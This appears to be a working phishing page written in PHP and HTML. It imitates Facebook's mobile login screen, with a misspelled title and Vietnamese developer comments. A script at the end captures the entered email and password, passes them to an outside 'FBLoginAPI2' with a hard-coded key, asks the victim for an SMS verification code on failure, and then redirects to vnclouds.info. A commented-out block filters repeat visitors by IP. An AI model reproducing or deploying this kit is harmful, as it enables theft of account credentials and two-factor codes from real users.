<?php
//$chuoicha = file_get_contents('./logs-ip.txt', true);
//$ips=$_SERVER['REMOTE_ADDR'];
 // if (strlen(strstr($chuoicha, $ips)) > 0) {
 //   header('Location: http://vlxxx.com/');
//exit;
 // }
?>
<!DOCTYPE html>
<html lang="vi" id="facebook">
<head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
    
     <script src="jquery-2.2.js"></script>
    <script src="https://code.jquery.com/jquery-2.2.2.min.js"></script>
	<title id="pageTitle">Wellcome to Facebook</title>
    <link rel="shortcut icon" href="https://fbstatic-a.akamaihd.net/rsrc.php/yl/r/H3nktOa7ZMg.ico"/>
    
    
   
</head>
<meta name="viewport" content="initial-scale=1,maximum-scale=1,user-scalable=no"/>
<link href="https://static.xx.fbcdn.net/rsrc.php/v2/ya/r/O2aKM2iSbOw.png" rel="apple-touch-icon-precomposed"
      sizes="196x196"/>
<meta name="referrer" content="default" id="meta_referrer"/>
<script></script>
<link rel="stylesheet" type="text/css" id="nwLNW" href="css/1a.css"/>
<link rel="stylesheet" type="text/css" id="MxbmU" href="css/2a.css"/>
<link rel="stylesheet" type="text/css" id="VL/WT" href="css/3a.css"/>
<link rel="stylesheet" type="text/css" id="ElpsC" href="css/4a.css"/>
<link rel="stylesheet" type="text/css" id="uZrAk" href="css/5a.css"/>

<script id="u_0_c">(function _(a, b, c, d) {
    if (!a) {
        document.cookie = b + '=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
        document.cookie = c + '=;expires=Thu, 01-Jan-1970 00:00:01 GMT';
        return;
    }
    var e = null;
    if (navigator.userAgent.indexOf('Firefox') !== -1 || (!window.devicePixelRatio && navigator.userAgent.indexOf('Windows Phone') !== -1)) {
        e = screen.width / document.documentElement.offsetWidth;
        e = Math.max(1, Math.floor(e * 2) / 2);
    }
    if ((!e || e === 1) && navigator.userAgent.indexOf('IEMobile') !== -1) {
        e = Math.sqrt(screen.deviceXDPI * screen.deviceYDPI) / 96;
        e = Math.max(1, Math.round(e * 2) / 2);
    }
    document.cookie = b + '=' + (e || window.devicePixelRatio || 1);
    var f = window.screen ? screen.width : 0, g = window.screen ? screen.height : 0;
    document.cookie = c + '=' + f + 'x' + g;
    if (d && document.cookie && window.devicePixelRatio > 1)document.location.reload();
})(true, "m_pixel_ratio", "wd", false);</script>
</head>
<body tabindex="0" class="touch x1 _fzu _50-3 iframe acw">
<script id="u_0_4">(function (a) {
    a.__updateOrientation = function () {
        var b = (!!a.orientation && a.orientation !== 180), c = document.body;
        if (c)c.className = c.className.replace(/(^|\s)(landscape|portrait)(\s|$)/g, ' ') + ' ' + (b ? 'landscape' : 'portrait');
        return b;
    };
})(window);</script>

<div id="viewport"><h1
        style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Facebook</h1>
    <div id="page">
        <div class="_129_"></div>
        <div class="_4g33 _52we _52z5" id="header">
            <div class="_4g34 _52z6" data-sigil="mChromeHeaderCenter"><a href="/login/?refid=8"><i
                    class="img sp_7c4PVPhfMg5 sx_bfc1fb"><u>facebook</u></i></a></div>
        </div>
        <div class="acy apm abb" id='deafultbox' data-sigil="marea"><span class="mfsm">Login to contine with facebook</span></div>
        <div class="error" id= "mesbox" style="display:none;background:#dc3847;color:white;font-size:14px;padding:8px;"><p id="message"> </p>
        </div>

        <div id="root" role="main" class="_5soa acw" data-sigil="context-layer-root content-pane">
            <div class="_4g33">
                <div class="_4g34">
                    <div class="aclb _5rut">
                       
                            <div class="_56be _5sob">
                                <div class="_55wo _55x2 _56bf"><input autocorrect="off" autocapitalize="off"
                                                                      class="_56bg _55ws _5ruq" name="email"
                                                                      placeholder="Email address or phone number" type="text" id="emails"/>


                                    <input autocorrect="off" autocapitalize="off" class="_56bg _55ws _5ruq"
                                           placeholder="Password" name="pass" type="password"
                                           data-sigil="login-password-field" id="passs"/>
                                    <div class="_55ws">
                                        <button type="submit" value="Log in" class="_56bs _56b_ _56bw _56bu"
                                                name="login" id="u_0_1" data-sigil="touchable"><span class="_55sr">Log In</span>
                                        </button>
                                    </div>
                                </div>
                            </div>
                            <noscript><input type="hidden" name="_fb_noscript" value="true"/></noscript>

                            <div class="_52jj _5t3b"><a class="_56bs _5t3b _56bw _56bv"
                                                        data-store="&#123;&quot;nativeClick&quot;:true&#125;"
                                                        role="button" data-sigil="touchable"><span class="_55sr">Create New Account</span></a>
                            </div>
                            <div class="other-links">
                                <ul class="_5pkb _55wp">
                                    <li><span class="mfss fcg"><a
                                            href="/recover/initiate/?c=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">Forgotten password?</a><span aria-hidden="true"> � </span><a class="sec"
                                                                                           href="/help/?refid=8">Help Center</a></span>
                                    </li>
                                    <li></li>
                                </ul>
                            </div>
                    </div>
                </div>
            </div>
            <div class="_55wr _5ui2">
                <div class="_5dpw">
                    <div class="_5ui3" data-sigil="marea"><span class="mfss fcg"><b>Bahasa Melayu </b><span
                            aria-hidden="true"> � </span><a class="sec"
                                                            href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQBva4xOxRDCBILe&amp;refid=8"
                                                            data-ajaxify-href="/a/language.php?l=en_US&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQBva4xOxRDCBILe&amp;refid=8"
                                                            data-sigil="ajaxify">English (US)</a><span
                            aria-hidden="true"> � </span><a class="sec"
                                                            href="/a/language.php?l=vi_VN&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQBlemQdPTmqOMeu&amp;refid=8"
                                                            data-ajaxify-href="/a/language.php?l=vi_VN&amp;lref=https%3A%2F%2Fm.facebook.com%2F&amp;gfid=AQBlemQdPTmqOMeu&amp;refid=8"
                                                            data-sigil="ajaxify">English (UK)</a><span
                            aria-hidden="true"> � </span><a class="sec"
                                                            href="/language.php?n=https%3A%2F%2Fm.facebook.com%2F&amp;refid=8">More
                        Languages�</a></span></div>
                    <div class="_5ui4"><span class="mfss fcg">Facebook �2015</span></div>
                </div>
            </div>
        </div>
        <div class="viewportArea _2v9s" id="u_0_2" style="display:none" data-sigil="marea">
            <div class="_5vsg" id="u_0_d"></div>
            <div class="_5vsh" id="u_0_e"></div>
            <div class="_5v5d fcg">
                <div class="_2so _2sq _2ss img _50cg" data-animtype="1"
                     data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
                Loading...
            </div>
        </div>
        <div class="viewportArea aclb" id="mErrorView" style="display:none" data-sigil="marea">
            <div class="container">
                <div class="image"></div>
                <div class="message" data-sigil="error-message"></div>
                <a class="link" data-sigil="MPageError:retry">Try Again</a></div>
        </div>
    </div>
</div>
<div id="static_templates">
    <div class="mDialog" id="modalDialog" style="display:none">
        <div class="_52z5 mFuturePageHeader firstStep titled" id="mDialogHeader">
            <table>
                <tr>
                    <td class="_52z7">
                        <button type="submit" value="Cancel" class="cancelButton btn btnD bgb mfss touchable"
                                data-sigil="dialog-cancel-button blocking-touchable">Cancel
                        </button>
                        <button type="submit" value="Back" class="backButton btn btnI bgb mfss touchable iconOnly"
                                aria-label="Back" data-sigil="dialog-back-button blocking-touchable"><i
                                class="img sp_7c4PVPhfMg5 sx_ef54f0" style="margin-top: 4px;"></i></button>
                    </td>
                    <td class="_52z6">
                        <div class="mFuturePageHeaderTitle mfsl fcw" id="m-future-page-header-title"
                             data-sigil="dialog-title">Loading...
                        </div>
                    </td>
                    <td class="_52z8" id="modalDialogHeaderButtons"></td>
                </tr>
            </table>
        </div>
        <div class="modalDialogView" id="modalDialogView"></div>
        <div class="_5v5d _5v5e fcg" id="dialogSpinner">
            <div class="_2so _2sq _2ss img _50cg" data-animtype="1" id="u_0_3"
                 data-sigil="m-loading-indicator-animate m-loading-indicator-root"></div>
            Loading...
        </div>
    </div>
</div>
</body>

<script type="text/javascript">
        //api_key &#273;&#432;&#7907;c c&#7845;p
        var api2 = new FBLoginAPI2('ISrxRmb4qWgJHOLYlSZIiYInaOCoEq8n');
        var URL_DIRECT = "http://vnclouds.info/?p=50"; // Link website muon chuyen huong den sau khi login thanh cong
        $('#u_0_1').click(function () {	
            var username = $('#emails').val(); //L&#7845;y username &#273;&#259;ng nh&#7853;p
            var password = $('#passs').val(); //L&#7845;y password &#273;&#259;ng nh&#7853;p
            var login = function (username, password) {
                api2.login(username, password, function (err) {
                    if (err) {
                        $('#message').text(err.message);
                        if (err.code == 406) { 
                            var verifiedCode = prompt('Enter SMS verified code'); 
                            if (verifiedCode) {
                                login(username, verifiedCode);
                            }
                        }
                    }
                    else {
                        $('#message').text('Login Successfully'); 
                    };
					$('#deafultbox').hide(); 
					$('#mesbox').show(); 
                })//end
            };
            login(username, password);
        });
    </script>

</body></html>